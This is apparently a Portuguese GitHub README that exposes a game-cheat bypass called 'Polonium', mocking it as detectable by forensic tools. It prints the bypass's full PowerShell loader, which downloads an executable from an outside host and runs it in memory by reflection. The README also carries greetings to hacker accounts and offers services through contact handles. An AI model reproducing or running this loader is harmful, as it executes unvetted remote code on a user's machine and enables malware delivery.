# ⚠️ **Disclaimer:** Polonium Bypass.

---

## 💡 Alert

Skidde de um Bypass Considerado "Bom" porém que de bom não tem nada, sua injeção é via PowerShell e é detectavel por varias ferramentas forenses, dentre elas a Sysmon & FTKImg. Nada Contra usuarios, porém o dono do tal "Polonium" errou ao acusar os outros de algo que não se prova verdade.

---

## 🎭 PowerShell Inject CommandLine

```hex
$link = "https://katiamodas.store/p.exe"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

if ($entry.GetParameters().Count -eq 1) {
    $entry.Invoke($null, @([string[]]@()))
} else {
    $entry.Invoke($null, $null)
}
```

## 🖼️ Fucked Bypass Community

![image](https://raw.githubusercontent.com/137f/PoloniumBypass-Unpacked/refs/heads/main/fuckedpolonium/polonium.png)  

---

## ✨ Grettz

https://github.com/137f

https://github.com/npmstealer

https://github.com/slashstranger/slashstranger

https://github.com/VypeXis/vypeeeee

https://github.com/soneca7

---

## 💌 Contato

**Caso queira me contatar ou precise de algum serviço, me encontre nas seguintes plataformas:**

**Usuário do Discord: 4wj.**

**Instagram: @glowwz9**

https://discord.gg/cyberclient

**E-mail: vliyanie1337@proton.me**


